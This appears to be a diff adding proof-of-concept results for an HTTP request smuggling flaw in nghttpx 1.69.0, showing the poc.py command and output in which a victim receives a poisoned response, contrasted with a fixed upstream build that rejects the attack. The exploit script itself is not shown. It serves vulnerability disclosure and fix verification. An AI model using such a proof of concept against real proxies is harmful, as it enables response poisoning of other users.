@@ -1,0 +1,56 @@
+Local verification date: 2026-06-26
+
+Vulnerable target:
+
+nghttp2 v1.69.0
+nghttpx nghttp2/1.69.0
+release commit 68cb6900fde14c77f0cd7add0e094a862960eb99
+
+Command:
+
+python3 poc.py --nghttpx ./build-v1.69.0/src/nghttpx --cwd ./nghttp2-v1.69.0
+
+Output:
+
+{
+  "attacker_body": "UPGRADE-REJECT",
+  "victim_body": "SMUGGLED-BENIGN-PAYLOAD",
+  "victim_received_poison": true,
+  "victim_received_expected": false,
+  "backend_connections": 2,
+  "backend_requests": [
+    [
+      "GET /upgrade HTTP/1.1",
+      "GET /poisoned HTTP/1.1",
+      "GET /victim HTTP/1.1"
+    ],
+    []
+  ],
+  "nghttpx_returncode": -15
+}
+
+Fixed-control target:
+
+upstream master after ab28105c4a0197da24f8bfc414bc116055249e1e
+nghttpx nghttp2/1.69.90
+
+Command:
+
+python3 poc.py --nghttpx ./build-fixed/src/nghttpx --cwd ./nghttp2-fixed --expect-fixed
+
+Output:
+
+{
+  "attacker_body": "<!DOCTYPE html><html lang=\"en\"><title>400 Bad Request</title><body><h1>400 Bad Request</h1><footer>nghttpx</footer></body></html>",
+  "victim_body": "VICTIM-RESPONSE",
+  "victim_received_poison": false,
+  "victim_received_expected": true,
+  "backend_connections": 2,
+  "backend_requests": [
+    [
+      "GET /victim HTTP/1.1"
+    ],
+    []
+  ],
+  "nghttpx_returncode": -15
+}
